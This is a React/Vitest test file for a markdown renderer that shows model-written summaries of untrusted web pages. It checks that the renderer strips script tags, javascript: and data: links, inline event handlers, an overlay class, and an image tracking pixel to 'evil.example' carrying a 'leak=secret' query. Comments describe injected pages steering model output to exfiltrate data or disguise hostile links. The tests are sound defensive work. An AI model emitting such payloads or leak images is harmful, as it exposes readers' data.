import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import MarkdownRenderer from "./markdown-renderer";

/**
 * These are not style tests. A summary is written by a model that has just read
 * an untrusted web page, so the sanitiser is the boundary between "the page a
 * stranger wanted us to render" and the workspace. Each case here is a vector
 * that has been used in the wild against markdown-rendering LLM output.
 */
describe("MarkdownRenderer", () => {
  it("escapes a script tag instead of executing it", () => {
    const { container } = render(
      <MarkdownRenderer
        source={"Before\n\n<script>window.pwned = 1</script>\n\nAfter"}
      />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toContain("Before");
  });

  it("drops a javascript: href", () => {
    const { container } = render(
      <MarkdownRenderer source="[click me](javascript:alert(1))" />,
    );
    const link = container.querySelector("a");
    expect(link?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  it("drops a data: href", () => {
    const { container } = render(
      <MarkdownRenderer source="[doc](data:text/html;base64,PHNjcmlwdD4=)" />,
    );
    const link = container.querySelector("a");
    expect(link?.getAttribute("href") ?? "").not.toContain("data:");
  });

  it("renders no image element, so an injected tracking pixel cannot phone home", () => {
    // The vector that needs no JavaScript at all: the request fires on render,
    // leaking the reader's address and whatever the injection encoded in the path.
    const { container } = render(
      <MarkdownRenderer source="![](https://evil.example/p.png?leak=secret)" />,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("strips an inline event handler written as raw HTML", () => {
    const { container } = render(
      <MarkdownRenderer source={'<div onclick="alert(1)">hello</div>'} />,
    );
    expect(container.querySelector("[onclick]")).toBeNull();
    expect(container.querySelector("div[onclick]")).toBeNull();
  });

  it("keeps an ordinary https link and shows where it goes", () => {
    render(
      <MarkdownRenderer source="[Supabase docs](https://supabase.com/docs)" />,
    );
    const link = screen.getByRole("link", { name: /supabase docs/i });
    expect(link).toHaveAttribute("href", "https://supabase.com/docs");
    // Injected markdown loves to label a hostile host with a trusted name.
    expect(link.textContent).toContain("supabase.com");
  });

  it("opens links in a new tab without handing over the opener", () => {
    render(<MarkdownRenderer source="[out](https://example.com/x)" />);
    const link = screen.getByRole("link", { name: /out/i });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel") ?? "").toContain("noopener");
  });

  it("renders the markdown a summary actually uses", () => {
    render(
      <MarkdownRenderer
        source={"- First point\n- Second point\n\n**Why it matters:** because."}
      />,
    );
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
    expect(screen.getByText("Why it matters:")).toBeInTheDocument();
  });

  it("renders a GitHub-flavored table", () => {
    render(
      <MarkdownRenderer
        source={"| Model | Price |\n| --- | --- |\n| Haiku | $1 |"}
      />,
    );
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "Haiku" })).toBeInTheDocument();
  });

  it("does not let a class attribute through onto rendered content", () => {
    const { container } = render(
      <MarkdownRenderer
        source={'<p class="fixed inset-0 z-50">covering</p>'}
      />,
    );
    // The paragraph is escaped to text; nothing gains a positioning class.
    expect(container.querySelector("p.fixed")).toBeNull();
  });
});
